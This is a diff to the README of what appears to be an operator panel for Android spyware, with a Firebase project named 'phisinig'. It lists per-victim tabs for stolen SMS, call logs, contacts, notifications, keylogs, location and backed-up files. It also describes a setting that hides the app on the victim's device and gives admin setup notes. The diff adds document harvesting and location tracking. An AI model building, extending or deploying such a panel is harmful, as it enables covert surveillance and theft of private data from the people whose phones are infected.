@@ -29,5 +29,7 @@ VITE_FIREBASE_STORAGE_BUCKET=phisinig.appspot.com
 ## Features
 
 - User list from `user_data/` + `users/` + `app_visibility/`
-- User detail tabs: profile, SMS, call logs, contacts, notifications, keylogs, gallery
+- User detail tabs: Documents (all backed-up files), SMS, call logs, contacts, notifications, keylogs, profile, location
+- RTDB: live `documents/{userId}` merged with legacy `user_data` / gallery / images
+- Deploy `firebase-rules.json` and `storage.rules` from repo root; panel admin reads use Firebase Auth email `admin@bushorat.app` (or `/admins/{uid}`)
 - Hide / Show app via `app_visibility/{userId}/is_hidden`
